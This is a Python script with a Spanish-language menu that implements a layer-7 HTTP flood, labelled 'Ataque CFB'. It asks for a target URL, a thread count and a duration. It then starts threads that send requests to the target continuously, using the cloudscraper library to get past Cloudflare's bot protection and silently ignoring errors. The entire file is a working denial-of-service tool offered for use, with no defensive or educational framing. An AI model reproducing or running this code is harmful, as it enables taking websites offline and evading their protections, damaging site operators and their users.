import datetime
import threading
import cloudscraper

def get_info_l7():
    target = input("Ingrese el objetivo: ")
    thread = input("Ingrese el hilo: ")
    t = int(input("Ingrese el valor t: "))  # Suponemos que t es un número entero
    return target, thread, t

def countdown(t):
    while t > 0:
        print("Tiempo restante:", t)
        t -= 1

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass

def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
        thd.start()

# Código principal
while True:
    print("Selecciona una opción:")
    print("1. Ataque CFB")
    print("2. Salir")
    choice = input("Ingrese el número de opción: ")

    if choice == "1":
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif choice == "2":
        break
    else:
        print("Opción inválida. Intente nuevamente.")
